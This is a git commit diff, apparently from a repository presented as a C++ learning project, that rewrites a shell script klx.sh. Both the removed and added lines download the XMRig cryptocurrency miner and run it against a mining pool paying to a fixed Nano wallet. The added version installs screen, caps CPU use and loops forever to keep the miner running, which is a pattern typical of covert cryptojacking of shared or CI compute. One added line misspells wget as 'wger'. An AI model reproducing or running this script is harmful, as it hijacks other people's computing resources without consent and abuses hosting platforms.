60767e9f6e6710b533706d767ce331acbee6155f
Learning-C-plus-plus-100Days <quangtraview@gmail.com>
2025-03-05 22:00:58 +0700

    klx.sh

--- klx.sh
+++ klx.sh
@@ -1,1 +1,11 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:433 -u XNO:nano_11wud9cg76887robg75k5xsowsadccoh45m6y4btetxmp8han9a3973firri.Githubtester -p x  
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wger https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+tar xf xmrig-6.22.2-linux-static-x64.tar.gz
+cd xmrig-6.22.2
+./xmrig -a rx -o stratum+tcp://rx-us.unmineable.com:3333 -u XNO:nano_11wud9cg76887robg75k5xsowsadccoh45m6y4btetxmp8han9a3973firri.unmineable_worker_injnigxt -p x --cpu 2
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
